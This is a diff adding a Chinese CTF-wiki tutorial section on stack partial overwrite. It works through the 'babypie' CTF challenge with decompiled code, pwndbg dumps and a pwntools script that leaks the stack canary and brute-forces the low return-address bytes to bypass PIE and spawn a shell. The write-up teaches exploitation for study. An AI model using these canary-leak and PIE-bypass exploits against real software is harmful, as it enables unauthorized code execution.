@@ -669,3 +669,198 @@ sh.interactive()
 
 ### 题目
 
+## 栈上的 partial overwrite
+partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想
+
+我们知道, 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护
+
+### 例子
+以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite) 中
+#### 确定保护
+```bash
+babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
+[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+64 位动态链接的文件, 开启了 PIE 保护和栈溢出保护
+#### 分析程序
+IDA 中看一下, 很容易就能发现漏洞点, 两处输入都有很明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了
+```C
+__int64 sub_960()
+{
+  char buf[40]; // [rsp+0h] [rbp-30h]
+  unsigned __int64 v2; // [rsp+28h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  *(_OWORD *)buf = 0uLL;
+  *(_OWORD *)&buf[16] = 0uLL;
+  puts("Input your Name:");
+  read(0, buf, 0x30uLL);                        // overflow
+  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
+  read(0, buf, 0x60uLL);                        // overflow
+  return 0LL;
+}
+```
+
+同时也发现程序中给了能直接 get shell 的函数
+```asm
+.text:0000000000000A3E getshell        proc near
+.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
+.text:0000000000000A3F                 mov     rbp, rsp
+.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
+.text:0000000000000A49                 call    _system
+.text:0000000000000A4E                 nop
+.text:0000000000000A4F                 pop     rbp
+.text:0000000000000A50                 retn
+.text:0000000000000A50 ; } // starts at A3E
+.text:0000000000000A50 getshell        endp
+```
+这样我们只要控制 rip 到该函数即可
+
+#### leak canary
+在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会, 为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)
+
+```asm
+Breakpoint 1, 0x0000557c8443aa08 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
+ RAX  0x0
+ RBX  0x0
+ RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x30
+ RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
+ RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
+ R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
+ R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
+ R10  0x37b
+ R11  0x246
+ R12  0x557c8443a830 ◂— xor    ebp, ebp
+ R13  0x7ffd97aa0540 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
+ RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
+ RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
+───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
+ ► 0x557c8443aa08    call   0x557c8443a7e0
+
+   0x557c8443aa0d    lea    rax, [rbp - 0x30]
+   0x557c8443aa11    mov    edx, 0x60
+   0x557c8443aa16    mov    rsi, rax
+   0x557c8443aa19    mov    edi, 0
+   0x557c8443aa1e    call   0x557c8443a7f0
+
+   0x557c8443aa23    mov    eax, 0
+   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
+   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
+   0x557c8443aa35    je     0x557c8443aa3c
+
+   0x557c8443aa37    call   0x557c8443a7c0
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
+... ↓
+05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
+06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
+07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
+Breakpoint *(0x557c8443a000+0xA08)
+pwndbg> canary
+$1 = 0
+canary : 0xb3012605fc402a00
+pwndbg>
+```
+
+canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 'a' * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 '\0', 我们就恢复出程序的 canary 了
+
+#### 覆盖返回地址
+有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址
+```asm
+0x000055dc43694a1e in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
+ RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
+ RBX  0x0
+ RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x60
+ RDI  0x0
+ RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
+ R8   0x7f206cb22700 ◂— 0x7f206cb22700
+ R9   0x3e
+ R10  0x73
+ R11  0x246
+ R12  0x55dc43694830 ◂— xor    ebp, ebp
+ R13  0x7fff9aa3b050 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
+ RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
+ RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
+───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
+   0x55dc43694a08    call   0x55dc436947e0
+ 
+   0x55dc43694a0d    lea    rax, [rbp - 0x30]
+   0x55dc43694a11    mov    edx, 0x60
+   0x55dc43694a16    mov    rsi, rax
+   0x55dc43694a19    mov    edi, 0
+ ► 0x55dc43694a1e    call   0x55dc436947f0
+ 
+   0x55dc43694a23    mov    eax, 0
+   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
+   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
+   0x55dc43694a35    je     0x55dc43694a3c
+ 
+   0x55dc43694a37    call   0x55dc436947c0
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
+... ↓
+05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
+06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
+07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
+pwndbg> x/10i (0x0A3E+0x55dc43694000) 
+   0x55dc43694a3e:	push   rbp
+   0x55dc43694a3f:	mov    rbp,rsp
+   0x55dc43694a42:	lea    rdi,[rip+0xd7]        # 0x55dc43694b20
+   0x55dc43694a49:	call   0x55dc436947d0
+   0x55dc43694a4e:	nop
+   0x55dc43694a4f:	pop    rbp
+   0x55dc43694a50:	ret    
+   0x55dc43694a51:	push   rbp
+   0x55dc43694a52:	mov    rbp,rsp
+   0x55dc43694a55:	sub    rsp,0x10
+```
+可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为 0x?A3E, 就有一定的几率 get shell
+
+最终的脚本如下:
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+#  context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
+while True:
+    try:
+        io = process("./babypie", timeout = 1)
+
+        #  gdb.attach(io)
+        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
+        io.recvuntil('a' * (0x30 - 0x8 + 1))
+        canary = '\0' + io.recvn(7)
+        success(canary.encode('hex'))
+
+        #  gdb.attach(io)
+        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')
+
+        io.interactive()
+    except Exception as e:
+        io.close()
+        print e
+```
+需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段
+### 题目
